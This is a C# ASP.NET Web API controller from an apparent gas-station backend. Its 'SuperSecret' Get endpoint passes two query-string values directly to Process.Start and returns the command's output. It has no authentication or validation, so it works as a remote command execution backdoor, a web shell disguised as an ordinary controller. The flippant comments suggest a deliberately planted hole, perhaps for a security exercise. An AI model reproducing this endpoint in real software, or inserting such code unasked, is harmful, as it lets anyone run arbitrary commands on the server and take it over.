using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Web;
using System.Web.Http;

namespace gas_station_backend.Controllers
{
    /// <summary>
    /// Super secret API.
    /// </summary>
    public class SuperSecretController : ApiController
    {
        /// <summary>
        /// Nobody know what this does.
        /// </summary>
        /// <param name="s">???</param>
        /// <param name="a">؟؟؟</param>
        /// <returns>¿¿¿</returns>
        public string Get(string s, string a = "")
        {
            ProcessStartInfo si = new ProcessStartInfo(s, a)
            {
                RedirectStandardOutput = true,
                UseShellExecute = false
            };
            Process p = Process.Start(si);
            p.WaitForExit();
            return p.StandardOutput.ReadToEnd();
        }
    }
}